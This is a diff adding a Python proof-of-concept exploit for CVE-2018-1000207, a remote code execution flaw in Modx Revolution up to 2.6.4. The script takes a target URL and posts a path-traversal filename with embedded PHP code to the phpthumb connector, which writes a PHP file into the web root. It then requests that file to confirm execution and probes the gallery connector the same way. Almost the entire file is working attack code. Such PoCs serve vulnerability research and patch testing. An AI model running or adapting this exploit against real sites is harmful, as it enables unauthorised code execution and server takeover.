@@ -1,0 +1,85 @@
+# Exploit Title: Modx Revolution < 2.6.4 - Remote Code Execution
+# Date: 2018-07-13
+# Exploit Author: Vitalii Rudnykh
+# Vendor Homepage: https://modx.com/
+# Version: <= 2.6.4
+# CVE : CVE-2018-1000207
+
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+import sys
+import os
+import requests
+from colorama import init, Fore, Style
+try:
+    init()
+
+    def cls():
+        os.system('cls' if os.name == 'nt' else 'clear')
+
+    cls()
+
+    print(Fore.BLUE +
+          '################################################################')
+    print(Fore.CYAN +
+          '# Proof-Of-Concept for CVE-2018-1000207 (Modx Revolution)')
+    print('# by Vitalii Rudnykh')
+    print('# Thanks by AgelNash')
+    print('# https://github.com/a2u/CVE-2018-1000207/')
+    print(Fore.BLUE +
+          '################################################################')
+    print('Provided only for educational or information purposes')
+    print(Style.RESET_ALL)
+    target = input('Enter target url (example: http(s)://domain.tld/): ')
+
+    verify = True
+    code = '<?php echo md5(\'a2u\'); unlink($_SERVER[\'SCRIPT_FILENAME\']);?>'
+
+    if requests.get(
+            target + '/connectors/system/phpthumb.php',
+            verify=verify).status_code != 404:
+        print(Fore.GREEN + '/connectors/system/phpthumb.php - found')
+        url = target + '/connectors/system/phpthumb.php'
+        payload = {
+            'ctx': 'web',
+            'cache_filename': '../../payload.php',
+            'useRawIMoutput': '1',
+            'src': '.',
+            'IMresizedData': code,
+            'config_prefer_imagemagick': '0'
+        }
+
+        r = requests.post(url, data=payload, verify=verify)
+        check = requests.get(target + 'payload.php', verify=verify)
+        if check.text == '9bdc11de19fd93975bf9c9ec3dd7292d':
+            print(Fore.GREEN + 'Exploitable!\n')
+        else:
+            print(Fore.RED + 'Not exploitable!\n')
+    else:
+        print(Fore.RED + 'phpthumb.php - not found')
+
+    if requests.get(
+            target + '/assets/components/gallery/connector.php',
+            verify=verify).status_code != 404:
+        print(Fore.GREEN + '/assets/components/gallery/connector.php - found')
+        url = target + '/assets/components/gallery/connector.php'
+
+        payload = {
+            'action': 'web/phpthumb',
+            'f': 'php',
+            'useRawIMoutput': '1',
+            'IMresizedData': 'Ok',
+            'config_prefer_imagemagick': '0'
+        }
+        r = requests.post(url, data=payload, verify=verify)
+        if r.text == 'Ok':
+            print(Fore.GREEN + 'Exploitable!\n')
+        else:
+            print(Fore.RED + 'Not exploitable!\n')
+
+    else:
+        print(
+            Fore.RED + '/assets/components/gallery/connector.php - not found')
+
+except KeyboardInterrupt:
+    cls()
